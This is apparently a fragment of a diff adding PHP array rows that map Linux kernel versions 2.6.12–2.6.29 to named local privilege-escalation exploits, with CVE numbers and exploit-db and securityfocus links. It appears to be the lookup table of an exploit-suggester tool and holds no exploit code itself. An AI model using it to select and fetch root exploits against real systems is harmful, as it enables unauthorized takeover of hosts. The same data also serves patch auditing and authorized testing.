+array('2.6.12', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'elfcd', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.13', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'kdump', 'local26', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.14', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.15', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.16', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.17', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'prctl', 'http://www.exploit-db.com/exploits/2004/', 'prctl2', 'http://www.exploit-db.com/exploits/2005/', 'prctl3', 'http://www.exploit-db.com/exploits/2006/', 'prctl4', 'http://www.exploit-db.com/exploits/2011/', 'py2', 'raptor_prctl', 'CVE-2006-2451' , 'http://www.exploit-db.com/exploits/2031/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.18', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.19', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.2', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.20', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.21', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.22', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092'),
+array('2.6.23', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092', 'vmsplice2', 'diane_lane' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5093'),
+array('2.6.24', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/', 'vmsplice1', 'jessica biel' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5092', 'vmsplice2', 'diane_lane' , 'CVE-2008-0600' , 'http://www.exploit-db.com/exploits/5093'),
+array('2.6.25', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.26', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sctp', 'CVE-2008-4113' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.27', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.28', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.29', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'can_bcm', 'CVE-2010-2959' , 'http://www.exploit-db.com/exploits/14814/', 'do_pages_move', 'sieve' , 'CVE-2010-0415' , 'Spenders Enlightenment', 'exit_notify', 'http://www.exploit-db.com/exploits/8369', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'msr', 'CVE-2013-0268' , 'http://www.exploit-db.com/exploits/27297/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'ptrace_kmod2', 'ia32syscall,robert_you_suck' , 'CVE-2010-3301' , 'http://www.exploit-db.com/exploits/15023/', 'reiserfs', 'CVE-2010-1146' , 'http://www.exploit-db.com/exploits/12130/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udev', 'udev <1.4.1' , 'CVE-2009-1185' , 'http://www.exploit-db.com/exploits/8478', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
